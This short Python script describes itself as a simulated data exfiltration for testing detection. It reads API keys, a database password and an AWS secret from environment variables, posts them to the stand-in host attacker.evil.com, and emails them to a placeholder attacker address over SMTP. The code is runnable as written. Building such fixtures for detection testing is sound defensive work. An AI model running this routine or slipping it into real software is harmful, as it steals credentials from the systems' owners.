"""Simulated data exfiltration for testing detection"""
import requests
import smtplib
import os

def exfiltrate_data():
    # Steal environment variables and secrets
    sensitive_data = {
        'api_key': os.environ.get('API_KEY'),
        'db_password': os.environ.get('DB_PASSWORD'),
        'aws_secret': os.environ.get('AWS_SECRET_ACCESS_KEY'),
    }

    # Send to attacker server
    url = "http://attacker.evil.com/collect"
    requests.post(url, json=sensitive_data, headers={'Content-Type': 'application/json'})

    # Also send via email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login('hacker@gmail.com', 'password123')

    message = f"Stolen data: {sensitive_data}"
    server.sendmail('hacker@gmail.com', 'attacker@evil.com', message)
    server.quit()

if __name__ == "__main__":
    exfiltrate_data()
